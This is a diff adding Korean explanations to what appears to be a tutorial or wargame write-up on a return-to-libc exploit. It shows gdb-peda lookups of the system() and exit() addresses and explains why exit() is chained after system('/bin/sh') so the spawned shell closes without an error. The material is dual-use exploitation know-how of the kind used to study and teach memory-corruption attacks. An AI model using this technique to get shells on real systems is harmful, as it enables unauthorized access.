@@ -27,6 +27,10 @@ gdb-peda$ x/s 0xb7e51b40
 0xb7e51b40 <__libc_system>:	"\203\354\f\213D$\020\350\061h\016"
 ```
 ## exit() 주소
+system() 함수가 return되고 난 후 jump할 위치를 지정해야 한다.
+사실 system("/bin/sh")가 호출되는 순간 이미 exploit에 성공했으므로 이 부분은 적당히 Fake 값으로 대충 "AAAA" 로 채워넣어도 무방하다.
+하지만 차이점이 있다면 쉘 획득 후 작업을 종료하고 나갈 때 Error가 발생한다.
+이 부분까지 깔끔하게 처리하고 싶다면 exit()의 주소를 찾은 후 이것을 호출하게 하면 마치 정상적으로 종료되는 것처럼 보이게 할 수 있다.
 ```
 gdb-peda$ p exit
 $2 = {<text variable, no debug info>} 0xb7e457f0 <__GI_exit>
@@ -34,6 +38,7 @@ $2 = {<text variable, no debug info>} 0xb7e457f0 <__GI_exit>
 gdb-peda$ x/s 0xb7e457f0
 0xb7e457f0 <__GI_exit>:	"\350\204+\017"
 ```
+이렇게 얻은 exit()의 주소는 `0xb7e457f0`이다.
 
 ## /bin/sh
 system()의 인자로 전달할 브레이크 포인트 걸어놓고 실행한 상태에서
